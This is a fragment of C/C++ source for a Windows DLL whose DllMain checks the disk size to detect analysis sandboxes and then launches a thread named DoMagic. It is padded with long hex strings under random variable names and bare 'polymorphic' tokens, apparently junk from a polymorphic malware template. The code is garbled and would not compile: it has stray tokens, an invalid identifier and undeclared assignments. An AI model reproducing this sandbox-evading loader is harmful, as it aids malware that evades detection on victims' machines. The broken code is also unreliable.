        msaeCwWelZmLNyPNIuaSvBp4e="47d738d1195e937f8e147648df9fefe4580aff5dd447ca97f17ad70ac1aa761d79b26b796ce4f3fca20f30d3ec2c3f974a4707cab6727fb9fbb04829908bc5cb2e0adad3e6e89c7823d2f90a1abc59f43577498bfe4a9abd29d1ba8c959ec71c198898da776702693f52476899b968d722921e9e77fc912171efef9993facff2307981288968fdd235aeffaf0d65953bbba34e3117466ac7aa7d7895ae783e1faf7957f7469cd53da682fff03907193033948109d3ed37c34fe7983122c3af842e719b0565e305af954bd36e7be8af25190c7ad98a94e94e79248fd77ae826b52cbfc63686aaa18c8a7f8cdd3c2eba8046eb19357493fe126d6549a365a6f4a66b6fe2e5b443fc7c683f5f83476ded00d1d216f1986f2b3daa31c2e35352a5d1e75475991fd5d7bd3fbdb8d3bd163258b67d00784ab0b77e8eb7cb66877f25a94c19595e1883e9df6f3ace9364"
    
                
                return 0;
            }
    
        
            sleep(1);
            
    }

    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD ul_reason_for_call,
        LPVOID lpReserved
    )
    {
    
    
        vuxQqfvqza4u="f1034378cebef2e3d324077d0b54d77cfb277ae5dafb8123d74ed70bd9aae43fca3dc8f71ce3cf82ea70e772048ba769021192b8cad98ffbcdd1988e46ea7340bcde19ef9859888bfd48309c4af836ff6a5c9dcb684452356f00883e49bea1632ce0e66fd082ef55faf75701133105c9c4ad96473d2d3942301f0f1740cde535344d410e77886ced7d5d2314d9a002b08f3c7de693f7f039f6dc50793ade2643db83ad949e5a02c9cde84526fb07ae95fd249205adbb1b2f51972ed303abaa14c1079aeb045995b873fa5c1b0a2f3c1026982d4fc27374d8ade972ed8827077fbfd298defdd9485f196af6b7c345cb21d4b592f61c4d708064daee52611d735948b659a515c42312521b088d6c47a3fa5fdc06f8f952fb2d3d77be5092d5105e0e957dfeaf703c333891db42b96d6e373177cd494221552e64cf4c0e440950f8d51f6d50f028705bb88e8db016a6"
    
    
    LPVOID allocation_start;
        HANDLE hThread;
        allocation_start = nullptr;
        //HANDLE threadHandle;
        
        
        0wzr2CERQQYb="8a8b735a72c0b0495a777ba20395f7521028b9c2ef1befd349da2ab16bebf04c83220d7d8766abbf5ffc9fb35d3bede70b762806cbabce78a3713cfcfeda03cfaf01acddd39845f1cfb173c50b21ac35d16aa42a723bf78d6ef2757f1c58c6f5b36c820030731b143c55d08b7bb590263b36bdabee743d04653ff5f6383c4e2e026c5d0af3286502a2710fc846f986c22cd892ae0787e40d3db2b372f79b6b84921b758c6d92e1f7a58a2d0e4654514b64c7f126595e063ab9fdc655f4da3fab397d49b116142b950bc5f555a367fc31f8c30b07ac71a708b877a89f172fd02d5ed0cb9c1773d38e0857642ea6cffc2bff15eb487d19ea62beb97d530a387ce26d194a48e4d21fe8196a7596f1a53a192491017707c99d3be2ebfb818c9346d04648171a77e4ca2a15f0beb8a3f026b3d17a2aa7abea0bbcd3881b953da89c7b3f76d9b67baebba2cc3c566073"
    
        
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        
            
        KmQOLh3gD2ClI1EVAnFGN="aafbb128008d66d616e266888187ec7b86cbf6c3a13b7a19866897619511e4857d8ae3e52e8aa3217e66c03981dd5e480939cc6ad6dfb561b85e4f03bac94b14cda2d6a96a1217254aa5f069837c6303318cb521f569935ad0def44478696a614972b10090fdf5ade4a50d71993aafd8275debd708158e73d06074971de5bc37591e1ac13818a95bec47ff6908983e3a144ba77fa3f18daac792fad0a9585a92ae9c827bd4a1ec30d5ff4acde5ffc459a6751b3c36917458c5aa56e18caae2ea03a9f29bb454e8be6977d9e0432fdf3e8474fed98904de1c168c0f81b3e07dcd6c633dc4728bca0c5ea546550e2c01cd0a98a4f5b0fab5dd820c44c59bd3e829281ac71b2106290e342ac1c64cc6dc3883d4e9d379f7ed3f7e5b3e167ff5ac22b9f4e974db8244b95c7986618a4d054b18457b3bc6c1253ad1d9e6b8a52bd05ee5977857e5c9446ccd022693caab"
    
            
            //sandbox check for harddisk size
            gensandbox_drive_size();
            
            
            polymorphic
            

            hThread = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
            CloseHandle(hThread);
            
            
            polymorphic
            
            
        case DLL_THREAD_ATTACH:
        
            
        h2LDTTbMK="63fae7ee85226189021a4a776979161c83188e962162dccddc3f1aa50ac45470d860494b93ce2795372818bb5ee5a8577376962e7b6bf67bc113e38f74096e7ab3b4fb4446a4397f138996175225cba73b1e3ab6589f16d9978a09a1e518811b75c4b04c8bd170bf13857bde27999328159ae8c7b2fc230c6cb8acd77c01ada47b83b0976cf8682fb3ccb9b4727357d54e4024c5fd8ebf60c2493cebdbffd1ff43e6cbf9971a2f0fc39012038b1af97e0b78aa818a60c3cad605098d7e22e73c56da235e5f51cec4b1dde14b33be2b5af0436d95f3946784ca9303b0bae666647ed3ab5927a267bbe05dd77177e6f25feab01856140d01c65c8a250078b6a4aff68ed0a95515331d54344ad9adacec03507c962116354188a29d736776b21e0b99cc45b8abd9ff3b2db406ee021d8f5f5927aa3e5cf4a70d2044d198d4522733abdb9621ac3fbfe306b49a1cae"
    
            break;
        case DLL_THREAD_DETACH:
        
            
            sleep(0);
            
            break;
        case DLL_PROCESS_DETACH:
        
            
        kfOQ83980W7fiMOSzQVpCZSEm0Gwr="218fd1c36f54b943cf3e76017799a7f4d4f090114fbf0bfa30a004961cb71f511ba16379264e9efbf7d839e5b8fa03c7a159a4b2f31478f003590b5687eb602b53e7c7bf41949afeff0eaaa93273991225426c183b6d139dca08222b67ab451338acc9edb04a46af42b7fe7a6e0a1e3c11aa5477a3e161b8b5c228c7053bce104fdffa6258011b075491598abc9a65747cae0209057b45af29e0b7377194c470368362ab3bbb9ec31ad07515cbf2d3ddea02ad3d57e475aa3ee03df5dbfabce988e1f1a555407143ea02fed0ad3315e903e8a03e2ab5851b13c666d1492e88b39ec35b59e1083ed9a5ed2854958ce82dc7a28268d227fd2c918ce66e36b075be9032c667613a1686c647f1707ae0277fd66fdfd379647c90b8ce4277f0dcb726da4ab2a35d90e80c16da1ad1c39d8c8e502de6efc78df46239d98711a79d8bc6156fa806920e8de5dfee91b5f7"
    
            break;
        }
        
        
            polymorphic
            
        
        return TRUE;
    }
    